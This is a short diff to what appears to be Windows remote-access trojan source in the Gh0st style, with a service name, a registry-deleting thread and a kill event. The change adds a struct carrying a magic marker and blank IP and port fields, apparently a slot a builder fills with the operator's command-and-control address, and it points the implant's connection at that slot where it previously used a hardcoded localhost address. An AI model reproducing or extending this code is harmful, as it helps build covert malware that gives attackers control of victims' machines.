@@ -9,6 +9,14 @@
 #pragma comment(lib,"shlwapi.lib")
 
 
+struct Connect_Address
+{
+	DWORD dwstact;
+	char  strIP[MAX_PATH];
+	int   nPort;
+}g_myAddress = { 0xCC28256,"",0 };
+
+
 DWORD WINAPI DelAXRegThread(LPVOID lpParam);
 
 char	svcname[MAX_PATH];
@@ -41,8 +49,8 @@ LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
 
 DWORD WINAPI main(char *lpServiceName)
 {
-	strcpy(g_strHost, "127.0.0.1");
-	g_dwPort = 8088;
+	strcpy(g_strHost, g_myAddress.strIP);
+	g_dwPort = g_myAddress.nPort;
 	// lpServiceName,在ServiceMain返回后就没有了
 	char	strServiceName[256] = {0};
 	char	strKillEvent[50] = { 0 };
